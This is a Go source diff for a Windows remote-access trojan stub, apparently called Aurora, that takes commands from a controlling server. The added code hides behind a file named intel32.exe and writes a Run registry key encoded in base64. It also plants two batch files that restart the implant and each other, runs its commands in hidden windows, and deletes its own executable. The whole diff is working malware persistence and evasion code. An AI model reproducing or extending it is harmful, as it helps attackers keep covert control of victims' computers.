@@ -8,9 +8,12 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"os/user"
 	"syscall"
 	"time"
 )
+
+var homeDir string
 
 type Stub struct {
 	conn    net.Conn
@@ -20,6 +23,11 @@ type Stub struct {
 }
 
 func main() {
+	usr, _ := user.Current()
+	homeDir = usr.HomeDir
+
+	addStartup()
+	addPersistence()
 	stub := Stub{}
 	stub.Start()
 }
@@ -82,16 +90,15 @@ func (stub *Stub) handlePackets() {
 					}
 					files[fileName].WriteAt(packet.FileData, packet.BytePos*1024)
 				}
-			case "MSG":
-				fmt.Println("Aurora: incoming message \"" + packet.StringData + "\"")
-			case "PERSIST":
+			case "STARTUP":
+				addStartup()
+			case "RMSTARTUP":
+				removeStartup()
+			case "PERSISTENCE":
 				addPersistence()
-			case "RMPERSIST":
+			case "RMPERSISTENCE":
 				removePersistence()
-			case "DC":
-				stub.conn = nil
-				return
-			case "REMOVE":
+			case "UNINSTALL":
 				uninstall()
 			}
 		}
@@ -117,8 +124,12 @@ func (stub *Stub) sendFile(fileName string) {
 }
 
 func uninstall() {
+	removeStartup()
 	removePersistence()
+	delSelf()
+}
 
+func delSelf() {
 	var sI syscall.StartupInfo
 	var pI syscall.ProcessInformation
 	argv, _ := syscall.UTF16PtrFromString(os.Getenv("windir") + "\\system32\\cmd.exe /C del " + os.Args[0])
@@ -137,38 +148,103 @@ func uninstall() {
 }
 
 func addPersistence() {
-	RegAdd := "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxXaW5kb3dzXHdpbmRsbC5leGU="
-	DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)
+	cmd("mkdir %APPDATA%\\Windows")
+	/*
+		TITLE ms32
+		SETLOCAL EnableExtensions
+		:SEARCH
+		tasklist /fi "WINDOWTITLE eq ms64" | findstr /C:"No tasks are running"
+		if %errorlevel% NEQ 1 (
+		  %APPDATA%\Windows\ms64.bat
+		  timeout 1
+		)
+		set EXE=intel32.exe
+		FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%x == %EXE% goto SEARCH
+		start %APPDATA%\Windows\intel32.exe
+		goto SEARCH
+	*/
 
-	persist, _ := os.Create("msdll.bat")
-	persist.WriteString("mkdir %APPDATA%\\Windows" + "\n")
-	persist.WriteString("copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe\n")
-	persist.WriteString(string(DecodedRegAdd))
-	persist.Close()
+	if _, err := os.Stat("%APPDATA%\\Windows\\ms32.bat"); os.IsNotExist(err) {
+		ms32Code := "VElUTEUgbXMzMg0KU0VUTE9DQUwgRW5hYmxlRXh0ZW5zaW9ucw0KOlNFQVJDSA0KdGFza2xpc3QgL2ZpICJXSU5ET1dUSVRMRSBlcSBtczY0IiB8IGZpbmRzdHIgL0M6Ik5vIHRhc2tzIGFyZSBydW5uaW5nIiANCmlmICVlcnJvcmxldmVsJSBORVEgMSAoDQogICVBUFBEQVRBJVxXaW5kb3dzXG1zNjQuYmF0DQogIHRpbWVvdXQgMQ0KKQ0Kc2V0IEVYRT1pbnRlbDMyLmV4ZQ0KRk9SIC9GICUleCBJTiAoJ3Rhc2tsaXN0IC9OSCAvRkkgIklNQUdFTkFNRSBlcSAlRVhFJSInKSBETyBJRiAlJXggPT0gJUVYRSUgZ290byBTRUFSQ0gNCnN0YXJ0ICVBUFBEQVRBJVxXaW5kb3dzXGludGVsMzIuZXhlDQpnb3RvIFNFQVJDSA=="
+		ms32Decoded, _ := base64.StdEncoding.DecodeString(ms32Code)
 
-	Exec := exec.Command("cmd", "/C", "msdll.bat")
-	Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	Exec.Run()
+		ms32, _ := os.Create(homeDir + "\\Windows\\ms32.bat")
+		ms32.WriteString(string(ms32Decoded))
+		ms32.Close()
 
-	Clean := exec.Command("cmd", "/C", "del msdll.bat")
-	Clean.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	Clean.Run()
+		cmd("%APPDATA%\\Windows\\ms32.bat")
+	}
+
+	/*
+		TITLE ms64
+		SETLOCAL EnableExtensions
+		:SEARCH
+		tasklist /fi "WINDOWTITLE eq ms32" | findstr /C:"No tasks are running"
+		if %errorlevel% NEQ 1 (
+		  %APPDATA%\Windows\ms32.bat
+		  timeout 1
+		)
+		set EXE=intel32.exe
+		FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%x == %EXE% goto SEARCH
+		start %APPDATA%\Windows\intel32.exe
+		goto SEARCH
+	*/
+
+	if _, err := os.Stat("%APPDATA%\\Windows\\ms64.bat"); os.IsNotExist(err) {
+		ms64Code := "VElUTEUgbXM2NA0KU0VUTE9DQUwgRW5hYmxlRXh0ZW5zaW9ucw0KOlNFQVJDSA0KdGFza2xpc3QgL2ZpICJXSU5ET1dUSVRMRSBlcSBtczMyIiB8IGZpbmRzdHIgL0M6Ik5vIHRhc2tzIGFyZSBydW5uaW5nIiANCmlmICVlcnJvcmxldmVsJSBORVEgMSAoDQogICVBUFBEQVRBJVxXaW5kb3dzXG1zMzIuYmF0DQogIHRpbWVvdXQgMQ0KKQ0Kc2V0IEVYRT1pbnRlbDMyLmV4ZQ0KRk9SIC9GICUleCBJTiAoJ3Rhc2tsaXN0IC9OSCAvRkkgIklNQUdFTkFNRSBlcSAlRVhFJSInKSBETyBJRiAlJXggPT0gJUVYRSUgZ290byBTRUFSQ0gNCnN0YXJ0ICVBUFBEQVRBJVxXaW5kb3dzXGludGVsMzIuZXhlDQpnb3RvIFNFQVJDSA=="
+		ms64Decoded, _ := base64.StdEncoding.DecodeString(ms64Code)
+
+		ms64, _ := os.Create(homeDir + "\\Windows\\ms64.bat")
+		ms64.WriteString(string(ms64Decoded))
+		ms64.Close()
+
+		cmd("%APPDATA%\\Windows\\ms64.bat")
+	}
 }
 
 func removePersistence() {
-	RegAdd := "UkVHIERFTEVURSBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL0Y="
-	DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)
+	/*
+		Taskkill /IM ms32.bat /F
+		Taskkill /IM ms64.bat /F
+	*/
 
-	persist, _ := os.Create("msdll.bat")
-	persist.WriteString("del /f %APPDATA%\\Windows\\windll.exe\n")
-	persist.WriteString(string(DecodedRegAdd))
+	code := "VGFza2tpbGwgL0lNIG1zMzIuYmF0IC9GDQpUYXNra2lsbCAvSU0gbXM2NC5iYXQgL0Y="
+	decoded, _ := base64.StdEncoding.DecodeString(code)
+
+	persist, _ := os.Create(homeDir + "\\Windows\\end.bat")
+	persist.WriteString(string(decoded))
 	persist.Close()
 
-	Exec := exec.Command("cmd", "/C", "msdll.bat")
-	Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	Exec.Run()
+	cmd("%APPDATA%\\Windows\\end.bat")
+	cmd("del %APPDATA%\\Windows\\ms32.bat")
+	cmd("del %APPDATA%\\Windows\\ms64.bat")
+	cmd("del %APPDATA%\\Windows\\end.bat")
+}
 
-	Clean := exec.Command("cmd", "/C", "del msdll.bat")
-	Clean.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	Clean.Run()
+func addStartup() {
+	// REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Intel32 /t REG_SZ /F /D %APPDATA%\Windows\intel32.exe
+	if _, err := os.Stat("%APPDATA%\\Windows\\intel32.exe"); os.IsNotExist(err) {
+		RegAdd := "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBJbnRlbDMyIC90IFJFR19TWiAvRiAvRCAlQVBQREFUQSVcV2luZG93c1xpbnRlbDMyLmV4ZQ=="
+		DecodedReg, _ := base64.StdEncoding.DecodeString(RegAdd)
+
+		cmd("copy " + os.Args[0] + " %APPDATA%\\Windows\\intel32.exe")
+		cmd(string(DecodedReg))
+
+		time.Sleep(1000000000)
+
+		delSelf()
+	}
+}
+
+func removeStartup() {
+	// REG DELETE HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Intel32 /F
+	RegAdd := "UkVHIERFTEVURSBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBJbnRlbDMyIC9G"
+	DecodedReg, _ := base64.StdEncoding.DecodeString(RegAdd)
+	cmd(string(DecodedReg))
+}
+
+func cmd(cmd string) {
+	run := exec.Command("cmd", "/C", cmd)
+	run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	run.Run()
 }
